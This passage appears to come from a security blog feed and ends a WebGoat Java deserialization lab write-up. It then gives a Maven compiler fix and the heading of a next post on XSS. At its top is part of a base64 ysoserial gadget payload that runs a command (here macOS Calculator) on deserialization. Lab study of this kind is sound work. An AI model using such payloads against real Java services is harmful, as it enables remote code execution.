BFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQA2L0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9yCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBABFqYXZhL2xhbmcvUHJvY2VzcwcANgEAB3dhaXRGb3IBAAMoKUkMADgAOQoANwA6AQANU3RhY2tNYXBUYWJsZQEAHXlzb3NlcmlhbC9Qd25lcjI4MzEwMDEyMDg1NDQ0AQAfTHlzb3NlcmlhbC9Qd25lcjI4MzEwMDEyMDg1NDQ0OwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4ABAABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAAC8AEgAAAAwAAQAAAAUAEwA-AAAAAQAVABYAAgAQAAAAPwAAAAMAAAABsQAAAAIAEQAAAAYAAQAAADQAEgAAACAAAwAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAZABoAAgAbAAAABAABABwAAQAVAB4AAgAQAAAASQAAAAQAAAABsQAAAAIAEQAAAAYAAQAAADgAEgAAACoABAAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAfACAAAgAAAAEAIQAiAAMAGwAAAAQAAQAcAAgAKQAGAAEAEAAAACkAAwADAAAAFKcAAwFMuAAvEjG2ADVNLLYAO1exAAAAAQA8AAAAAwABAwACACMAAAACACQAJQAAAAoAAQAHACYAKAAJdXEAfgAuAAAB1Mr-ur4AAAA0ABsKAAIAAwcABAwABQAGAQAQamF2YS9sYW5nL09iamVjdAEABjxpbml0PgEAAygpVgcACAEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vBwAKAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAZAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAA0ZvbwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4AAQABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAADwAEgAAAAwAAQAAAAUAEwAUAAAAAgAVAAAAAgAWABcAAAAKAAEABwAYABoACXB0AARQd25ycHcBAHhxAH4ABXNxAH4AAnEAfgAScQB-ACtxAH4AMng</span><br></pre></td></tr></table></figure>
-
-<p><code>/Users/seikei/.m2/repository/org/hibernate/hibernate-core/5.0.12.Final/hibernate-core-5.0.12.Final.jar!/org/hibernate/engine/spi/TypedValue.class</code></p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/TypeValue.png" alt="TypeValue"></p>
-<p><code>/Users/seikei/.m2/repository/org/hibernate/hibernate-core/5.0.12.Final/hibernate-core-5.0.12.Final.jar!/org/hibernate/property/access/spi/GetterMethodImpl.class</code></p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/GetterMethodImpl.png" alt="GetterMethodImpl"></p>
-<p><code>/Applications/IntelliJ IDEA.app/Contents/jbr/Contents/Home!/java.xml/jdk/xml/internal/JdkXmlFeatures.class</code></p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/JdkXmlFeatures.png" alt="JdkXmlFeatures"></p>
-<h2 id="Java报错"><a href="#Java报错" class="headerlink" title="Java报错"></a>Java报错</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Error:java: error: release version 5 not supported</span><br></pre></td></tr></table></figure>
-
-<p>在maven中添加</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
   </entry>
   <entry>
     <title>前端框架中XSS的代码表现形式</title>
